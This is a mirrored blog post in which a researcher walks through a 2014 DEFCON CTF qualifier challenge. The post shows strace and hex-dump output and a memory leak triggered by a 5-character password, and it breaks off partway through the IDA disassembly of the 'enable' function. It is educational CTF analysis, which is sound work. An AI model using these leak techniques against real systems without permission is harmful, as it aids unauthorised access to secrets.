@@ -1,0 +1,504 @@
+<!doctype html>
+<!--
+
+    EEEEE  N   N  DDD     GGG     A    M   M  EEEEE
+    EE     NN  N  D  D   G       A A   MM MM  EE
+    EEEE   N N N  D   D G  GGG  A A A  M M M  EEEE
+    EE     N  NN  D  D   G   G  A   A  M   M  EE     ##
+    EEEEE  N   N  DDD     GGG   A   A  M   M  EEEEE  ##
+
+    Thanks for checking out our code!
+    We are always looking for the most inquisitive and creative front-end developers.
+    Contact us at info@endgame.com or check our careers page for openings.
+
+-->
+<html lang="en-us" id='top'>
+
+<!-- Mirrored from www.endgame.com/blog/defcon-capture-the-flag-qualification-challenge-1.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 18 Nov 2014 14:55:11 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge;chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <title dir="ltr">DEFCON Capture the Flag Qualification Challenge #1 | Endgame.</title>
+    <meta name="description" content="" />
+    <link rel="stylesheet" type="text/css" href="http://cloud.typography.com/6815252/750422/css/fonts.css" />
+    <link href="../css/app.css" rel="stylesheet" type="text/css" />
+</head>
+<body class="inner">
+    <div id='contact-us' class='js-contact-form'>
+    <h1>Sign Up for Endgame News and Communications</h1>
+    <form action="https://www.salesforce.com/servlet/servlet.WebToLead?encoding=UTF-8" method="POST">
+	<input type=hidden name="oid" value="00Dd0000000e4Bs">
+	<input type=hidden name="retURL" value="../index.html">
+	<label for="first_name">First Name</label><input  required id="first_name" name="first_name" type="text" /><br>
+	<label for="last_name">Last Name</label><input  required id="last_name" name="last_name" type="text" /><br>
+	<label for="email">Email</label><input  required id="email" name="email" type="text" /><br>
+	<label for="company">Company</label><input  required id="company" name="company" type="text" /><br>
+	<label for="title">Title</label><input  required id="title" name="title" type="text" /><br>
+	<input type="submit" class='button--red' name="submit">
+    </form>
+    </div>
+    <header role="banner" class="cf">
+        <h2>
+            <a href="../index.html">
+                <img class='logo2' alt="Endgame logo" src="images/logo.png" />
+                <div class="period" data-url="/"></div>
+            </a>
+        </h2>
+        <span class="brgr-brdr m" id="brgr-brdr"></span>
+        <span class="brgr-menu m" id="brgr-menu"></span>
+        <nav>
+            <ul id="nav">
+                <li>
+                    <a href="../capabilities/index.html">Capabilities</a>
+                </li>
+                <li>
+                    <a href="../federal/index.html">Federal</a>
+                </li>
+                <li>
+                    <a href="../about/index.html">About</a>
+                </li>
+                <li>
+                    <a href="../news/index.html">Blog &amp; News</a>
+                </li>
+                <li>
+                    <a href="../careers/index.html">Careers</a>
+                </li>
+                <li class='contact-dropdown'>
+                    <span>
+                        <em>Contact</em>
+                    </span>
+                </li>
+                <div id="contact-wrap">
+                    <div id="contact">
+                        <p class="media">
+                            <img src="../images/contact-media.svg" />
+                            <strong>Media Inquiries:</strong><br />
+                            <a href="mailto:media@endgame.com">media@endgame.com</a>
+                        </p>
+                        <p class="general">
+                            <img src="../images/contact-general.svg">
+                            <strong>General Inquiries</strong><br />
+			    <a href="mailto:info@endgame.com">info@endgame.com</a>
+                        </p>
+                        <p class="location">
+                            <img src="../images/contact-location.svg">
+                            <a href="../careers/index.html#locations">3101 Wilson Blvd., Suite 500<br />Arlington, VA 22201</a>
+                        </p>
+			<p class='newsletter'>
+			  <img src='../images/icons/mail.svg'>
+			  <strong><a href='#' class='js-open-contact-form contact-form-icon'>Sign Up for News</a></strong>
+			</p>
+                        <p class="social">
+                            <a href="https://www.facebook.com/EndgameInc">
+                                <img src="../images/icons/facebook.svg" />
+                            </a>
+                            <a href="https://twitter.com/EndgameInc">
+                                <img src="../images/icons/twitter.svg" />
+                            </a>
+                            <a href="http://www.linkedin.com/company/endgame">
+                                <img src="../images/icons/linkedin.svg" />
+                            </a>
+                        </p>
+                    </div>
+                </div>
+            </ul>
+        </nav>
+    </header>
+
+    <div role="main" class="boiler">
+        <h1>DEFCON Capture the Flag Qualification Challenge #1</h1>
+        
+<h3 id="by_steve_vittitoe">by <a href="../archives/index.html">Steve Vittitoe</a></h3>
+
+<p>I constantly challenge myself to gain deeper knowledge in reverse engineering, vulnerability discovery, and exploit mitigations. By day, I channel this knowledge and passion into my job as a security researcher at Endgame. By night, I use these skills as a Capture the Flag code warrior. I partook in the DEFCON CTF qualification round this weekend to help sharpen these skills and keep up with the rapid changes in reverse engineering technology. DEFCON CTF qualifications are a fun, and sometimes frustrating, way to cultivate my skillset by solving challenges alongside my team, Samurai.</p>
+
+<h3 id="ctf_background">CTF Background</h3>
+
+<p>For those of you who aren’t familiar with a computer security CTF game, Wikipedia provides a <a href="https://en.wikipedia.org/wiki/Capture_the_flag">simple explanation</a>. The qualification round for the DEFCON CTF is run jeopardy style while the actual game is an attack/defense model. Qualifications ran all weekend for 48 hours with no breaks. Since 2013 the contest has been run by volunteers belonging to a hacker club called the <a href="https://legitbs.net/">Legitimate Business Syndicate</a>, which is partly comprised of former Samurai members. They did a fantastic job with qualifications this year and ran a smooth game with almost no downtime, solid technical challenges, round the clock support and the obligatory good-natured heckling. As a fun exercise, let’s walk through an interesting problem from the game. All of the problems from the CTF game can be found <a href="https://github.com/ctfs/write-ups/tree/master/def-con-ctf-qualifier-2014">here</a>.</p>
+
+<h3 id="problem_introduction">Problem Introduction</h3>
+
+<p>The first challenge was written by someone we’ll call Mr. G and was worth 2 points. Upon opening the challenge you are presented with the following text:</p>
+<div class='highlight'><pre><code class='java'><span class='nl'>http:</span><span class='c1'>//services.2014.shallweplayaga.me/shitsco_c8b1aa31679e945ee64bde1bdb19d035 is running at:</span>
+
+<span class='n'>shitsco_c8b1aa31679e945ee64bde1bdb19d035</span><span class='o'>.</span><span class='mi'>2014</span><span class='o'>.</span><span class='na'>shallweplayaga</span><span class='o'>.</span><span class='na'>me</span><span class='o'>:</span><span class='mi'>31337</span>
+    
+<span class='n'>Capture</span> <span class='n'>the</span> <span class='n'>flag</span><span class='o'>.</span>
+</code></pre></div>
+<p>Downloading the shitsco_c8b1aa31679e945ee64bde1bdb19d035 file and running the “file” command reveals:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>user</span><span class='nd'>@ubuntu</span><span class='o'>:~</span><span class='n'>$</span>  <span class='n'>file</span> <span class='n'>shitsco</span>
+    
+<span class='nl'>shitsco:</span> <span class='n'>ELF</span> <span class='mi'>32</span><span class='o'>-</span><span class='n'>bit</span> <span class='n'>LSB</span> <span class='n'>executable</span><span class='o'>,</span> <span class='n'>Intel</span> <span class='mi'>80386</span><span class='o'>,</span> <span class='n'>version</span> <span class='mi'>1</span> <span class='o'>(</span><span class='n'>SYSV</span><span class='o'>),</span> <span class='n'>dynamically</span> <span class='n'>linked</span> <span class='o'>(</span><span class='n'>uses</span> <span class='n'>shared</span> <span class='n'>libs</span><span class='o'>),</span> <span class='k'>for</span> <span class='n'>GNU</span><span class='o'>/</span><span class='n'>Linux</span> <span class='mf'>2.6</span><span class='o'>.</span><span class='mi'>24</span><span class='o'>,</span> <span class='n'>BuildID</span><span class='o'>[</span><span class='n'>sha1</span><span class='o'>]=</span><span class='mh'>0x8657c9bdf925b4864b09ce277be0f4d52dae33a6</span><span class='o'>,</span> <span class='n'>stripped</span>
+</code></pre></div>
+<p>This is an ELF file that we can assume will run on a Linux 32-bit OS. Symbols were stripped to make reverse engineering a bit more difficult. At least it is not statically linked. I generally like to run strings on a binary at this point to get a quick sense of what might be happening in the binary. Doing this shows several string APIs imported and text that looks to be indicative of a command prompt style interface. Let’s run the binary to confirm this:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>user</span><span class='nd'>@ubuntu</span><span class='o'>:~</span><span class='n'>$</span>  <span class='o'>./</span><span class='n'>shitsco</span>
+<span class='n'>Failed</span> <span class='n'>to</span> <span class='n'>open</span> <span class='n'>password</span> <span class='nl'>file:</span> <span class='n'>No</span> <span class='n'>such</span> <span class='n'>file</span> <span class='n'>or</span> <span class='n'>directory</span>
+</code></pre></div>
+<p>Ok, the program did not do what I expected. We will need to add a user shitsco and create a file in his home directory called password. I determined this by running:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>shitsco</span><span class='nd'>@ubuntu</span><span class='o'>:~</span><span class='n'>$</span>  <span class='n'>sudo</span> <span class='n'>strace</span> <span class='o'>./</span><span class='n'>shitsco</span>
+<span class='err'>…</span>
+<span class='n'>open</span><span class='o'>(</span><span class='s'>&quot;/home/shitsco/password&quot;</span><span class='o'>,</span> <span class='n'>O_RDONLY</span><span class='o'>)</span> <span class='o'>=</span> <span class='o'>-</span><span class='mi'>1</span> <span class='n'>ENOENT</span> <span class='o'>(</span><span class='n'>No</span> <span class='n'>such</span> <span class='n'>file</span> <span class='n'>or</span> <span class='n'>directory</span><span class='o'>)</span>
+<span class='err'>…</span>
+</code></pre></div>
+<p>We can see that the file /home/shitsco/password was opened for reading and that this failed (ENOENT) because the file did not exist. You should create this file without a new line on the end or you might have trouble later on. I discovered this through trial and error. After creating the file we get better results:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>shitsco</span><span class='nd'>@ubuntu</span><span class='o'>:~</span><span class='n'>$</span>  <span class='n'>echo</span> <span class='err'>–</span><span class='n'>n</span> <span class='n'>asdf</span> <span class='o'>&gt;</span> <span class='o'>/</span><span class='n'>home</span><span class='o'>/</span><span class='n'>shitsco</span><span class='o'>/</span><span class='n'>password</span>
+<span class='n'>shitsco</span><span class='nd'>@ubuntu</span><span class='o'>:~</span><span class='n'>$</span>  <span class='o'>./</span><span class='n'>shitsco</span>
+
+  <span class='n'>oooooooo8</span> <span class='n'>oooo</span>        <span class='n'>o88</span>    <span class='n'>o8</span>
+<span class='mi'>888</span>         <span class='mi'>888</span><span class='n'>ooooo</span>   <span class='n'>oooo</span> <span class='n'>o888oo</span>  <span class='n'>oooooooo8</span>    <span class='n'>ooooooo</span>     <span class='n'>ooooooo</span>
+ <span class='mi'>888</span><span class='n'>oooooo</span>  <span class='mi'>888</span>   <span class='mi'>888</span>   <span class='mi'>888</span>  <span class='mi'>888</span>   <span class='mi'>888</span><span class='n'>ooooooo</span>  <span class='mi'>888</span>     <span class='mi'>888</span> <span class='mi'>888</span>     <span class='mi'>888</span>
+        <span class='mi'>888</span> <span class='mi'>888</span>   <span class='mi'>888</span>   <span class='mi'>888</span>  <span class='mi'>888</span>           <span class='mi'>888</span> <span class='mi'>888</span>         <span class='mi'>888</span>     <span class='mi'>888</span>
+<span class='n'>o88oooo888</span> <span class='n'>o888o</span> <span class='n'>o888o</span> <span class='n'>o888o</span>  <span class='mi'>888</span><span class='n'>o</span> <span class='mi'>88</span><span class='n'>oooooo88</span>    <span class='mi'>88</span><span class='n'>ooo888</span>    <span class='mi'>88</span><span class='n'>ooo88</span>
+
+<span class='n'>Welcome</span> <span class='n'>to</span> <span class='n'>Shitsco</span> <span class='n'>Internet</span> <span class='n'>Operating</span> <span class='nf'>System</span> <span class='o'>(</span><span class='n'>IOS</span><span class='o'>)</span>
+<span class='n'>For</span> <span class='n'>a</span> <span class='n'>command</span> <span class='n'>list</span><span class='o'>,</span> <span class='n'>enter</span> <span class='o'>?</span>
+    
+<span class='n'>$</span> <span class='o'>?</span>
+<span class='o'>==========</span><span class='n'>Available</span> <span class='n'>Commands</span><span class='o'>==========</span>
+<span class='o'>|</span><span class='n'>enable</span>                               <span class='o'>|</span>
+<span class='o'>|</span><span class='n'>ping</span>                                 <span class='o'>|</span>
+<span class='o'>|</span><span class='n'>tracert</span>                              <span class='o'>|</span>
+<span class='o'>|?</span>                                    <span class='o'>|</span>
+<span class='o'>|</span><span class='n'>shell</span>                                <span class='o'>|</span>
+<span class='o'>|</span><span class='n'>set</span>                                  <span class='o'>|</span>
+<span class='o'>|</span><span class='n'>show</span>                                 <span class='o'>|</span>
+<span class='o'>|</span><span class='n'>credits</span>                              <span class='o'>|</span>
+<span class='o'>|</span><span class='n'>quit</span>                                 <span class='o'>|</span>
+<span class='o'>======================================</span>
+<span class='n'>Type</span> <span class='o'>?</span> <span class='n'>followed</span> <span class='n'>by</span> <span class='n'>a</span> <span class='n'>command</span> <span class='k'>for</span> <span class='n'>more</span> <span class='n'>detailed</span> <span class='n'>information</span>
+<span class='n'>$</span>
+</code></pre></div>
+<p>This looks like fun. We have what looks to be a router prompt. Typically, the goal with these binary exploitation problems is to identify somewhere that user input causes the program to crash and then devise a way to make that input take control over the program and reveal a file called flag residing on the remote machine. At this point, I have two choices. I can play around with the input to see if I can get it to crash or I can dive into the reverse engineering. I opted to play around with the input and the first thing that caught my attention was the shell command!</p>
+<div class='highlight'><pre><code class='java'><span class='n'>Welcome</span> <span class='n'>to</span> <span class='n'>Shitsco</span> <span class='n'>Internet</span> <span class='n'>Operating</span> <span class='nf'>System</span> <span class='o'>(</span><span class='n'>IOS</span><span class='o'>)</span>
+<span class='n'>For</span> <span class='n'>a</span> <span class='n'>command</span> <span class='n'>list</span><span class='o'>,</span> <span class='n'>enter</span> <span class='o'>?</span>
+<span class='n'>$</span> <span class='n'>shell</span>
+<span class='n'>bash</span><span class='o'>-</span><span class='mf'>3.2</span><span class='n'>$</span>
+</code></pre></div>
+<p>No way, it couldn’t be that easy. Waiting 5 seconds produces:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>Yeah</span><span class='o'>,</span> <span class='n'>right</span><span class='o'>.</span>
+</code></pre></div>
+<p>Ok, let the taunting begin. We can ignore the shell command. Thanks for the laugh Mr. G. By playing with the command line interface, I found the command input length was limited to 80 characters with anything coming after 80 characters applying to the next command. The set and show commands looked interesting, but even adding 1000 variables of different lengths failed to produce any interesting behavior. Typically, I am looking for a way to crash the program at this point.</p>
+
+<p>What really looked like the solution came from the enable command:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>enable</span>
+<span class='n'>Please</span> <span class='n'>enter</span> <span class='n'>a</span> <span class='nl'>password:</span> <span class='n'>asdf</span>
+<span class='n'>Authentication</span> <span class='n'>Successful</span>
+<span class='err'>#</span> <span class='o'>?</span>
+<span class='o'>==========</span><span class='n'>Available</span> <span class='n'>Commands</span><span class='o'>==========</span>
+<span class='o'>|</span><span class='n'>enable</span>                               <span class='o'>|</span>
+<span class='o'>|</span><span class='n'>ping</span>                                 <span class='o'>|</span>
+<span class='o'>|</span><span class='n'>tracert</span>                              <span class='o'>|</span>
+<span class='o'>|?</span>                                    <span class='o'>|</span>
+<span class='o'>|</span><span class='n'>flag</span>                                 <span class='o'>|</span>
+<span class='o'>|</span><span class='n'>shell</span>                                <span class='o'>|</span>
+<span class='o'>|</span><span class='n'>set</span>                                  <span class='o'>|</span>
+<span class='o'>|</span><span class='n'>show</span>                                 <span class='o'>|</span>
+<span class='o'>|</span><span class='n'>credits</span>                              <span class='o'>|</span>
+<span class='o'>|</span><span class='n'>quit</span>                                 <span class='o'>|</span>
+<span class='o'>|</span><span class='n'>disable</span>                              <span class='o'>|</span>
+<span class='o'>======================================</span>
+<span class='n'>Type</span> <span class='o'>?</span> <span class='n'>followed</span> <span class='n'>by</span> <span class='n'>a</span> <span class='n'>command</span> <span class='k'>for</span> <span class='n'>more</span> <span class='n'>detailed</span> <span class='n'>information</span>
+<span class='err'>#</span> <span class='n'>flag</span>
+<span class='n'>The</span> <span class='n'>flag</span> <span class='nl'>is:</span> <span class='n'>foobarbaz</span>
+</code></pre></div>
+<p>The password for the enable prompt comes from the password file we created earlier. I also created a file in /home/shitsco/ called flag with the contents foobarbaz; which is now happily displayed on my console. The help (? command) after we enter “enabled mode” has two extra commands: disable and flag. So, if I can get the enable password on the remote machine, then I can simply run the flag command and score points on the problem. Ok, we have a plan, but how to crack that password?</p>
+
+<h3 id="the_enable_password">The “Enable” Password</h3>
+
+<p>To recover this password, the first option that comes to mind is brute force. This is usually an option of last resort in CTF competitions. Just think about what could happen to this poor service if 1000 people decided to brute force the challenge. Having an inaccessible service spoils the fun for others playing. It’s time to dive a bit deeper and see if there is anything else we could try.</p>
+
+<p>I tried long passwords, passwords with format strings such as %s, empty passwords, and passwords with binary data. None of these produced any results. However, a password length of 5 caused a strange behavior:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>enable</span>
+<span class='n'>Please</span> <span class='n'>enter</span> <span class='n'>a</span> <span class='nl'>password:</span> <span class='n'>AAAAA</span>
+<span class='n'>Nope</span><span class='o'>.</span>  <span class='n'>The</span> <span class='n'>password</span> <span class='n'>isn</span><span class='err'>&#39;</span><span class='n'>t</span> <span class='n'>AAAAA</span><span class='err'>▒</span><span class='n'>r</span><span class='err'>▒@▒</span><span class='n'>r</span><span class='err'>▒▒ο`</span><span class='n'>M_</span><span class='err'>▒`▒▒▒</span><span class='n'>t</span><span class='err'>▒</span>
+</code></pre></div>
+<p>Ok, that looks like we’re getting extra memory back. If we look at it as hex we see:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>shitsco</span><span class='nd'>@ubuntu</span><span class='o'>:~</span><span class='n'>$</span>  <span class='n'>echo</span> <span class='o'>-</span><span class='n'>e</span> <span class='n'>enable</span><span class='err'>\\</span><span class='n'>nAAAAA</span><span class='err'>\\</span><span class='n'>n</span> <span class='o'>|</span> <span class='o'>./</span><span class='n'>shitsco</span> <span class='o'>|</span> <span class='n'>xxd</span>
+<span class='err'>…</span>
+<span class='mi'>0000220</span><span class='o'>:</span> <span class='mi'>2020</span> <span class='mi'>5468</span> <span class='mi'>6520</span> <span class='mi'>7061</span> <span class='mi'>7373</span> <span class='mi'>776</span><span class='n'>f</span> <span class='mi'>7264</span> <span class='mi'>2069</span>    <span class='n'>The</span> <span class='n'>password</span> <span class='n'>i</span>
+<span class='mi'>0000230</span><span class='o'>:</span> <span class='mi'>736</span><span class='n'>e</span> <span class='mi'>2774</span> <span class='mi'>2041</span> <span class='mi'>4141</span> <span class='mi'>4141</span> <span class='n'>f07c</span> <span class='n'>b740</span> <span class='n'>f47c</span>  <span class='n'>sn</span><span class='err'>&#39;</span><span class='n'>t</span> <span class='n'>AAAAA</span><span class='o'>.|.</span><span class='err'>@</span><span class='o'>.|</span>
+<span class='mi'>0000240</span><span class='o'>:</span> <span class='n'>b792</span> <span class='mi'>90</span><span class='n'>c1</span> <span class='n'>bf60</span> <span class='n'>c204</span> <span class='mi'>0808</span> <span class='mi'>8</span><span class='n'>d69</span> <span class='n'>b760</span> <span class='n'>c204</span>  <span class='o'>.....</span><span class='err'>`</span><span class='o'>.....</span><span class='na'>i</span><span class='o'>.</span><span class='err'>`</span><span class='o'>..</span>
+<span class='mi'>0000250</span><span class='o'>:</span> <span class='mi'>08</span><span class='n'>a0</span> <span class='mi'>297</span><span class='n'>f</span> <span class='n'>b701</span> <span class='mi'>0</span><span class='n'>a24</span> <span class='mi'>200</span><span class='n'>a</span> <span class='mi'>3</span><span class='n'>a20</span> <span class='mi'>496</span><span class='n'>e</span> <span class='mi'>7661</span>  <span class='o'>..)....</span><span class='n'>$</span> <span class='o'>.:</span> <span class='n'>Inva</span>
+<span class='mi'>0000260</span><span class='o'>:</span> <span class='mi'>6</span><span class='n'>c69</span> <span class='mi'>6420</span> <span class='mi'>636</span><span class='n'>f</span> <span class='mi'>6</span><span class='n'>d6d</span> <span class='mi'>616</span><span class='n'>e</span> <span class='mi'>640</span><span class='n'>a</span> <span class='mi'>2420</span>       <span class='n'>lid</span> <span class='n'>command</span><span class='o'>.</span><span class='n'>$</span>
+</code></pre></div>
+<p>The bit that starts 0xf0 0x7c is the start of the memory disclosure. Looking a little further, we see 0x60 0xc2 0x04 0x08. This looks like it could be a little endian encoded pointer for 0x0804c260. This is pretty cool and all, but where is the password?</p>
+
+<p>I tried sending in all possible password lengths and it was always leaking the same amount of data. But the leak only worked if the password is more than 4 characters. It’s time to turn to IDA Pro and focus in on the function for the enable command.</p>
+
+<p>This is the disassembly for the function responsible for handling the enable command. It is easy to find with string cross references:</p>
+<div class='highlight'><pre><code class='java'><span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>enable</span>          <span class='n'>proc</span> <span class='n'>near</span>               <span class='o'>;</span> <span class='n'>DATA</span> <span class='nl'>XREF:</span> <span class='o'>.</span><span class='na'>data</span><span class='o'>:</span><span class='mi'>0804</span><span class='n'>C270o</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>dest</span>            <span class='o'>=</span> <span class='n'>dword</span> <span class='n'>ptr</span> <span class='o'>-</span><span class='mi'>4</span><span class='n'>Ch</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>src</span>             <span class='o'>=</span> <span class='n'>dword</span> <span class='n'>ptr</span> <span class='o'>-</span><span class='mi'>48</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>n</span>               <span class='o'>=</span> <span class='n'>dword</span> <span class='n'>ptr</span> <span class='o'>-</span><span class='mi'>44</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>term</span>            <span class='o'>=</span> <span class='kt'>byte</span> <span class='n'>ptr</span> <span class='o'>-</span><span class='mi'>40</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>s2</span>              <span class='o'>=</span> <span class='kt'>byte</span> <span class='n'>ptr</span> <span class='o'>-</span><span class='mi'>34</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>var_14</span>          <span class='o'>=</span> <span class='n'>dword</span> <span class='n'>ptr</span> <span class='o'>-</span><span class='mi'>14</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>cookie</span>          <span class='o'>=</span> <span class='n'>dword</span> <span class='n'>ptr</span> <span class='o'>-</span><span class='mi'>10</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>arg_0</span>           <span class='o'>=</span> <span class='n'>dword</span> <span class='n'>ptr</span>  <span class='mi'>4</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span>                 <span class='n'>push</span>    <span class='n'>esi</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049231</span>                 <span class='n'>push</span>    <span class='n'>ebx</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049232</span>                 <span class='n'>sub</span>     <span class='n'>esp</span><span class='o'>,</span> <span class='mi'>44</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049235</span>                 <span class='n'>mov</span>     <span class='n'>esi</span><span class='o'>,</span> <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>arg_0</span><span class='o'>]</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049239</span>                 <span class='n'>mov</span>     <span class='n'>eax</span><span class='o'>,</span> <span class='n'>large</span> <span class='nl'>gs:</span><span class='mi'>14</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>0804923</span><span class='n'>F</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>cookie</span><span class='o'>],</span> <span class='n'>eax</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049243</span>                 <span class='n'>xor</span>     <span class='n'>eax</span><span class='o'>,</span> <span class='n'>eax</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049245</span>                 <span class='n'>mov</span>     <span class='n'>eax</span><span class='o'>,</span> <span class='o'>[</span><span class='n'>esi</span><span class='o'>]</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049247</span>                 <span class='n'>test</span>    <span class='n'>eax</span><span class='o'>,</span> <span class='n'>eax</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049249</span>                 <span class='n'>jz</span>      <span class='n'>loc_80492D8</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>0804924</span><span class='n'>F</span>                 <span class='n'>lea</span>     <span class='n'>ebx</span><span class='o'>,</span> <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>s2</span><span class='o'>]</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049253</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>n</span><span class='o'>],</span> <span class='mi'>20</span><span class='n'>h</span> <span class='o'>;</span> <span class='n'>n</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>0804925</span><span class='n'>B</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>src</span><span class='o'>],</span> <span class='n'>eax</span> <span class='o'>;</span> <span class='n'>src</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>0804925</span><span class='n'>F</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>dest</span><span class='o'>],</span> <span class='n'>ebx</span> <span class='o'>;</span> <span class='n'>dest</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049262</span>                 <span class='n'>call</span>    <span class='n'>_strncpy</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049267</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049267</span> <span class='nl'>loc_8049267:</span>                            <span class='o'>;</span> <span class='n'>CODE</span> <span class='nl'>XREF:</span> <span class='n'>enable</span><span class='o'>+</span><span class='n'>EDj</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049267</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>src</span><span class='o'>],</span> <span class='n'>ebx</span> <span class='o'>;</span> <span class='n'>s2</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>0804926</span><span class='n'>B</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>dest</span><span class='o'>],</span> <span class='n'>offset</span> <span class='n'>password_mem</span> <span class='o'>;</span> <span class='n'>s1</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049272</span>                 <span class='n'>call</span>    <span class='n'>_strcmp</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049277</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>var_14</span><span class='o'>],</span> <span class='n'>eax</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>0804927</span><span class='n'>B</span>                 <span class='n'>mov</span>     <span class='n'>eax</span><span class='o'>,</span> <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>var_14</span><span class='o'>]</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>0804927</span><span class='n'>F</span>                 <span class='n'>test</span>    <span class='n'>eax</span><span class='o'>,</span> <span class='n'>eax</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049281</span>                 <span class='n'>jz</span>      <span class='kt'>short</span> <span class='n'>loc_80492B8</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049283</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>n</span><span class='o'>],</span> <span class='n'>ebx</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049287</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>src</span><span class='o'>],</span> <span class='n'>offset</span> <span class='n'>aNope_ThePasswo</span> <span class='o'>;</span> <span class='s'>&quot;Nope.  The password isn&#39;t %s\n&quot;</span>
